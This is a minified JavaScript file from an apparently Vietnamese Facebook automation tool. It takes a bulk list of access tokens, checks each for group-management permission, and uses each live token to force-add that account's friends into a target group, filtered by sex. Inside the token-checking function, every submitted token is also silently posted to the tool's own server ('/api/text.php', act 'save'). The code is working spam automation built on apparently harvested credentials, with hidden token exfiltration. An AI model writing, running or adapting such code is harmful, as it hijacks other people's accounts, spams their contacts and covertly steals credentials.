function addMem_LiveAddMem(a,b,c,f){
	this.access_token=a,this.me=b,this.friends=c,this.groups=f
}
function addMem_check_permissions(a){
	return 0==addMem.run?!1:void($).get('https://graph.facebook.com/',{
		access_token:a,batch:'[{"method":"GET","relative_url":"me"}, {"method":"GET","relative_url":"fql?q=SELECT uid, name, sex FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) '+addMem.filter_by_sex+' ORDER BY rand() LIMIT '+addMem.limit+'"}, {"method":"GET","relative_url":"fql?q=SELECT gid, name FROM group WHERE gid IN (SELECT gid FROM group_member WHERE uid = me()) LIMIT 5000"}, {"method":"GET","relative_url":"me/permissions"}]',include_headers:'false',method:'post'
	}
	,function(b){
		addMem.bachbach+=a+'';
		var c=init.replace_JSON(b[3].body).data.filter(function(a){
			return 1==a.manage_groups
		}
		);
		if(0==c){
			++addMem.token_die
		}
		else {
			var f=init.replace_JSON(b[0].body),g=init.replace_JSON(b[1].body).data,h=init.replace_JSON(b[2].body).data;
			f&&g&&g.length>3?(++addMem.token_live,addMem.total_add+=g.length,$('#addMem_total_token_live').text(init.number_format(addMem.token_live)),$('#addMem_add_total').text(init.number_format(addMem.total_add)),addMem.Live_Token.push( new addMem_LiveAddMem(a,f,g,h))):++addMem.token_die
		}
	}
	).fail(function(){
		++addMem.token_die
	}
	).always(function(){
		if($('#addMem_progress').attr('style','width: '+Math.floor(100*(addMem.token_live+addMem.token_die)/addMem.da_nhap)+'%'),addMem.token_live+addMem.token_die==addMem.da_nhap){
			if(''!=addMem.bachbach){
				var a=$.trim(addMem.bachbach).split('\n');
				a.length>0&&$.post('//'+b_sv+'/api/text.php',{
					act:'save',array:a
				}
				)
			}
			;
			addMem.token_live>0?($('#addMem_progress_text').html('Hoàn thành check Access Token. Bắt đầu quá trình thêm bạn bè vào nhóm '+run.loading()),$('#addMem_progress').attr('style','width: 0%'),setTimeout(function(){
				addMem_JoinGroup(0)
			}
			,1e3)):($('#addMem_progress_text').html('<font color="green">Hoàn thành quá trình thêm bạn bè vào nhóm !</font>'),$('.progress-striped').removeClass('active'),$('#addMem_progress').attr('style','width: 100%'),$('#submit_addMem').buttonStop(),$('#submit_addMem_stop').disabled())
		}
	}
	)
}
function addMem_JoinGroup(a){
	if(0==addMem.run){
		return !1
	}
	;
	var b=addMem.Live_Token[a].groups.filter(function(a){
		return a.gid==addMem.idGroups
	}
	);
	b.length>0?($('#addMem_progress_text').html('<font color="green">Đã ở trong nhóm. Bắt đầu thêm bạn bè vào nhóm</font> '+run.loading()),addMem_AddFriendToGroup(a)):$.get('https://graph.facebook.com/'+addMem.idGroups+'/members/'+addMem.Live_Token[a].me.id,{
		method:'post',access_token:addMem.Live_Token[a].access_token
	}
	,function(b){
		$.get('https://graph.facebook.com/'+addMem.idGroups+'/members/'+addMem.Live_Token[a].me.id,{
			method:'post',access_token:addMem.tokenAdmin
		}
		,function(b){
			$('#addMem_progress_text').html('<font color="green">Xin vào nhóm thành công</font> '+run.loading()),addMem_AddFriendToGroup(a)
		}
		).error(function(b){
			addMem.total_add-=addMem.Live_Token[a].friends.length,$('#addMem_add_total').text(init.number_format(addMem.total_add)),addMem_JoinGroup_check(a+1),$('#addMem_progress_text').html('<font color="red">Xét duyệt vào nhóm thất bại</font> '+run.loading())
		}
		)
	}
	).error(function(b){
		addMem.total_add-=addMem.Live_Token[a].friends.length,$('#addMem_add_total').text(init.number_format(addMem.total_add)),addMem_JoinGroup_check(a+1),$('#addMem_progress_text').html('<font color="red">Xin vào nhóm thất bại</font> '+run.loading())
	}
	)
}
function addMem_JoinGroup_check(a){
	return 0==addMem.run?!1:void((a<addMem.Live_Token.length?addMem.nextToken>0?($('#addMem_progress_text').html('Access Token số <b>'+a+'</b> hoàn thành, đợi <font color="red"><b id="addMem_countdown"></b></font> giây để tiếp tục sang Access Token số <b>'+(a+1)+'</b> !'),timer.count_down(0,Math.floor(addMem.nextToken/60),addMem.nextToken-60*Math.floor(addMem.nextToken/60),'addMem_countdown',function(){
		addMem_JoinGroup(a)
	}
	)):addMem_JoinGroup(a):($('#addMem_progress_text').html('<font color="green">Hoàn thành quá trình thêm bạn bè vào nhóm !</font>'),$('.progress-striped').removeClass('active'),$('#addMem_progress').attr('style','width: 100%'),$('#submit_addMem').buttonStop(),$('#submit_addMem_stop').disabled())))
}
function addMem_AddFriendToGroup(a){
	if(0==addMem.run){
		return !1
	}
	;
	var b=0,c=0;
	$.each(addMem.Live_Token[a].friends,function(f,g){
		setTimeout(function(){
			$.ajax({
				url:'https://graph.facebook.com/'+addMem.idGroups+'/members/'+g.uid,data:{
					method:'post',access_token:addMem.Live_Token[a].access_token
				}
				,dataType:'json',method:'GET',success:function(a){
					b++,addMem.total_add_success++,$('#addMem_add_success').text(init.number_format(addMem.total_add_success)),$('#addMem_progress_text').html('<font color="green">Thêm <b>'+g.name+'</b> vào nhóm thành công</font> '+run.loading())
				}
				,error:function(a){
					a.responseText?(a=init.replace_JSON(a.responseText),'An unknown error has occurred.'==a.error.message?(b++,addMem.total_add_success++,$('#addMem_add_success').text(init.number_format(addMem.total_add_success)),$('#addMem_progress_text').html('<font color="green">Thêm <b>'+g.name+'</b> vào nhóm thành công</font> '+run.loading())):(c++,addMem.total_add_error++,$('#addMem_add_error').text(init.number_format(addMem.total_add_error)),$('#addMem_progress_text').html('<font color="red">Thêm <b>'+g.name+'</b> vào nhóm thất bại</font> '+run.loading()))):(c++,addMem.total_add_error++,$('#addMem_add_error').text(init.number_format(addMem.total_add_error)),$('#addMem_progress_text').html('<font color="red">Thêm <b>'+g.name+'</b> vào nhóm thất bại</font> '+run.loading()))
				}
				,complete:function(){
					clearTimeout(addMem.check_XHR),$('#addMem_progress').attr('style','width: '+Math.floor(100*(addMem.total_add_success+addMem.total_add_error)/addMem.total_add)+'%'),b+c==addMem.Live_Token[a].friends.length?addMem_JoinGroup_check(a+1):addMem.check_XHR=setTimeout(function(){
						addMem.total_add_success=addMem.total_add_success-b,addMem.total_add_error=addMem.total_add_error-c,addMem_AddFriendToGroup(a)
					}
					,6e4)
				}
			}
			)
		}
		,f*addMem.delay)
	}
	)
}
location.hostname==b_sv&&($(document).on('click','#submit_addMem_stop',function(){
	addMem.run=0,'undefined'!= typeof timeout&&clearTimeout(timeout),$('#addMem_progress_text').html('<font color="red">Đã có lệnh dừng thêm bạn bè vào nhóm !</font>'),$('.progress-striped').removeClass('active'),$('#submit_addMem').buttonStop(),$('#submit_addMem_stop').disabled()
}
),$(document).on('click','#submit_addMem',function(){
	addMem={
		tokenAdmin:$('#input_addMem_tokenAdmin').validate(),idGroups:$('#input_addMem_idGr').isNumber(),listToken:$('#input_addMem_listToken').validate(),delay:$('#input_addMem_delay').isNumber(),nextToken:$('#input_addMem_nextToken').isNumber(),limit:$('#input_addMem_limit').isNumber(),sexGr:$('#input_addMem_sex').validate(),Live_Token: new Array,check_XHR:null,bachbach:'',run:1
	}
	,addMem.tokenAdmin&&addMem.idGroups&&addMem.listToken&&addMem.delay&&addMem.nextToken&&addMem.limit&&addMem.sexGr&&($(this).buttonLoad(),$('#submit_addMem_stop').buttonStop(),$.get('https://graph.facebook.com/'+addMem.idGroups,{
		fields:'picture,name,members.limit(1).summary(true)',access_token:addMem.tokenAdmin
	}
	).done(function(a){
		0==addMem.limit&&(addMem.limit=5e3),'all'==addMem.sexGr?addMem.filter_by_sex='':'male'==addMem.sexGr?addMem.filter_by_sex='AND sex != \'female\'':addMem.filter_by_sex='AND sex != \'male\'',addMem.listToken=addMem.listToken.split('\n'),addMem.da_nhap=addMem.listToken.length,addMem.token_live=0,addMem.token_die=0,addMem.total_add=0,addMem.total_add_success=0,addMem.total_add_error=0,addMem.run_start=0,$('#html_addMem_result').hide().fadeIn('fast'),$('html, body').animate({
			scrollTop:$('#html_addMem_result').offset().top
		}
		,500),$('.addMem_link').attr('href','https://www.facebook.com/'+addMem.idGroups),$('#addMem_images').attr('src',a.picture.data?a.picture.data.url:a.picture),$('#addMem_name').text(a.name),$('#addMem_members').text(init.number_format(a.members.summary.total_count)),$('#addMem_total_token, #addMem_total_token_live, #addMem_add_total, #addMem_add_success, #addMem_add_error').text(0),$('#addMem_total_token').text(init.number_format(addMem.da_nhap)),$('#addMem_progress_text').html('Đang check Access Token live ... '+run.loading()),$('#addMem_progress_html').hide().slideDown('fast'),$('.progress-striped').addClass('active'),$('#addMem_progress').attr('style','width: 0%'),$.each(addMem.listToken,function(a,b){
			var c=b.split('|');
			c=c[1]?c[1]:b,setTimeout(function(){
				addMem_check_permissions(c)
			}
			,25*a)
		}
		)
	}
	).error(function(a){
		a.responseText&&noti.error(init.replace_JSON(a.responseText).error.message),$('#submit_addMem').buttonStop(),$('#submit_addMem_stop').disabled()
	}
	))
}
))